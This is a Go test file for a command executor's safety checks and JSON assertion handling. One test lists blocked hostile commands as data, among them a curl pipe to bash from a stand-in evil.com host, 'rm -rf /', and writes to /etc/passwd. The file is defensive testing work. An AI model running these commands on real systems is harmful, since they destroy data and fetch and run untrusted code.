// [REQ:REQ-P0-008] Secure CLI Command Execution
package validation

import (
	"context"
	"os"
	"path/filepath"
	"testing"
	"time"

	"development-toolchain-validator/domain/expectation"
)

func TestCLIExecutor_NewCLIExecutor(t *testing.T) {
	t.Run("default timeout", func(t *testing.T) {
		e := NewCLIExecutor("/tmp")
		if e.timeout != DefaultCommandTimeout {
			t.Errorf("expected timeout %v, got %v", DefaultCommandTimeout, e.timeout)
		}
	})

	t.Run("custom timeout", func(t *testing.T) {
		customTimeout := 5 * time.Second
		e := NewCLIExecutor("/tmp", WithTimeout(customTimeout))
		if e.timeout != customTimeout {
			t.Errorf("expected timeout %v, got %v", customTimeout, e.timeout)
		}
	})

	t.Run("working directory set", func(t *testing.T) {
		dir := "/home/test"
		e := NewCLIExecutor(dir)
		if e.workingDir != dir {
			t.Errorf("expected workingDir %s, got %s", dir, e.workingDir)
		}
	})
}

func TestCLIExecutor_DangerousCommandBlocking(t *testing.T) {
	// [REQ:REQ-P0-008] Dangerous commands blocked
	executor := NewCLIExecutor("/tmp")
	ctx := context.Background()

	tests := []struct {
		name    string
		command string
		wantMsg string
	}{
		{
			name:    "rm command blocked",
			command: "rm -rf /",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "sudo command blocked",
			command: "sudo apt install something",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "pipe to bash blocked",
			command: "curl http://evil.com/script | bash",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "eval blocked",
			command: "eval $(cat /etc/passwd)",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "command substitution blocked",
			command: "echo $(whoami)",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "kill command blocked",
			command: "kill -9 1234",
			wantMsg: "dangerous command blocked",
		},
		{
			name:    "redirect to root blocked",
			command: "echo hacked > /etc/passwd",
			wantMsg: "dangerous command blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assertion := &expectation.CLIAssertion{
				ID:       "test-" + tt.name,
				Command:  tt.command,
				JSONPath: "$",
				Operator: expectation.OpExists,
			}

			result := executor.ValidateAssertion(ctx, assertion)

			if result.Status != StatusError {
				t.Errorf("expected StatusError, got %s", result.Status)
			}
			if result.Message == "" || !contains(result.Message, tt.wantMsg) {
				t.Errorf("expected message containing %q, got %q", tt.wantMsg, result.Message)
			}
		})
	}
}

func TestCLIExecutor_CommandTimeout(t *testing.T) {
	// [REQ:REQ-P0-008] Commands timeout after 30s (using shorter timeout for test)
	executor := NewCLIExecutor("/tmp", WithTimeout(100*time.Millisecond))
	ctx := context.Background()

	assertion := &expectation.CLIAssertion{
		ID:       "timeout-test",
		Command:  "sleep 10 && echo '{}'",
		JSONPath: "$",
		Operator: expectation.OpExists,
	}

	result := executor.ValidateAssertion(ctx, assertion)

	if result.Status != StatusError {
		t.Errorf("expected StatusError for timeout, got %s", result.Status)
	}
	if !contains(result.Message, "timed out") {
		t.Errorf("expected timeout message, got %q", result.Message)
	}
}

func TestCLIExecutor_CommandExecution(t *testing.T) {
	// [REQ:REQ-P0-008] Command execution safe
	tmpDir := t.TempDir()
	executor := NewCLIExecutor(tmpDir)
	ctx := context.Background()

	tests := []struct {
		name       string
		command    string
		wantStatus ValidationStatus
		wantMsg    string
	}{
		{
			name:       "simple echo JSON",
			command:    `echo '{"status": "ok"}'`,
			wantStatus: StatusPassed,
			wantMsg:    "assertion passed",
		},
		{
			name:       "command with JSON array",
			command:    `echo '[1, 2, 3]'`,
			wantStatus: StatusPassed,
			wantMsg:    "assertion passed",
		},
		{
			name:       "command not found",
			command:    "nonexistentcommand --json",
			wantStatus: StatusError,
			wantMsg:    "command execution failed",
		},
		{
			name:       "invalid JSON output",
			command:    "echo 'not json'",
			wantStatus: StatusError,
			wantMsg:    "failed to parse JSON",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assertion := &expectation.CLIAssertion{
				ID:       "test-" + tt.name,
				Command:  tt.command,
				JSONPath: "$",
				Operator: expectation.OpExists,
			}

			result := executor.ValidateAssertion(ctx, assertion)

			if result.Status != tt.wantStatus {
				t.Errorf("expected status %s, got %s (message: %s)", tt.wantStatus, result.Status, result.Message)
			}
			if !contains(result.Message, tt.wantMsg) {
				t.Errorf("expected message containing %q, got %q", tt.wantMsg, result.Message)
			}
		})
	}
}

func TestCLIExecutor_WorkingDirectory(t *testing.T) {
	// Create temp dir with a test file
	tmpDir := t.TempDir()
	testFile := filepath.Join(tmpDir, "test.json")
	if err := os.WriteFile(testFile, []byte(`{"exists": true}`), 0644); err != nil {
		t.Fatal(err)
	}

	executor := NewCLIExecutor(tmpDir)
	ctx := context.Background()

	assertion := &expectation.CLIAssertion{
		ID:            "workdir-test",
		Command:       "cat test.json",
		JSONPath:      "$.exists",
		Operator:      expectation.OpEq,
		ExpectedValue: true,
	}

	result := executor.ValidateAssertion(ctx, assertion)

	if result.Status != StatusPassed {
		t.Errorf("expected StatusPassed, got %s: %s", result.Status, result.Message)
	}
}

func TestCLIExecutor_ValidateAll(t *testing.T) {
	tmpDir := t.TempDir()
	executor := NewCLIExecutor(tmpDir)
	ctx := context.Background()

	assertions := []*expectation.CLIAssertion{
		{
			ID:            "batch-1",
			Command:       `echo '{"value": 1}'`,
			JSONPath:      "$.value",
			Operator:      expectation.OpEq,
			ExpectedValue: float64(1),
		},
		{
			ID:            "batch-2",
			Command:       `echo '{"value": 2}'`,
			JSONPath:      "$.value",
			Operator:      expectation.OpEq,
			ExpectedValue: float64(2),
		},
		{
			ID:            "batch-3",
			Command:       `echo '{"value": 3}'`,
			JSONPath:      "$.value",
			Operator:      expectation.OpEq,
			ExpectedValue: float64(1), // Will fail
		},
	}

	results := executor.ValidateAll(ctx, assertions)

	if len(results) != 3 {
		t.Fatalf("expected 3 results, got %d", len(results))
	}

	pass, fail, skip, errCount := CountAssertionResults(results)
	if pass != 2 || fail != 1 || skip != 0 || errCount != 0 {
		t.Errorf("expected (2,1,0,0), got (%d,%d,%d,%d)", pass, fail, skip, errCount)
	}
}

func TestCLIExecutor_ContextCancellation(t *testing.T) {
	executor := NewCLIExecutor("/tmp")
	ctx, cancel := context.WithCancel(context.Background())

	// Cancel context before execution
	cancel()

	assertion := &expectation.CLIAssertion{
		ID:       "cancel-test",
		Command:  "sleep 5 && echo '{}'",
		JSONPath: "$",
		Operator: expectation.OpExists,
	}

	result := executor.ValidateAssertion(ctx, assertion)

	// Should fail due to context cancellation
	if result.Status != StatusError {
		t.Errorf("expected StatusError for cancelled context, got %s", result.Status)
	}
}

func TestCLIExecutor_AllowedCommands(t *testing.T) {
	// Test that allowed command prefixes work correctly
	executor := NewCLIExecutor("/tmp")
	ctx := context.Background()

	// This tests the safety check passes for allowed commands
	// The actual execution may fail if the command doesn't exist
	tests := []struct {
		name    string
		command string
	}{
		{"jq command", "jq --version"},
		{"yq command", "yq --version"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assertion := &expectation.CLIAssertion{
				ID:       "allowed-" + tt.name,
				Command:  tt.command,
				JSONPath: "$",
				Operator: expectation.OpExists,
			}

			result := executor.ValidateAssertion(ctx, assertion)

			// Command should not be blocked as dangerous
			// (may fail for other reasons like command not found or non-JSON output)
			if contains(result.Message, "dangerous command blocked") {
				t.Errorf("allowed command was blocked as dangerous: %s", tt.command)
			}
		})
	}
}

// contains is a helper for substring checking.
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 ||
		(len(s) > 0 && len(substr) > 0 && containsSubstr(s, substr)))
}

func containsSubstr(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}
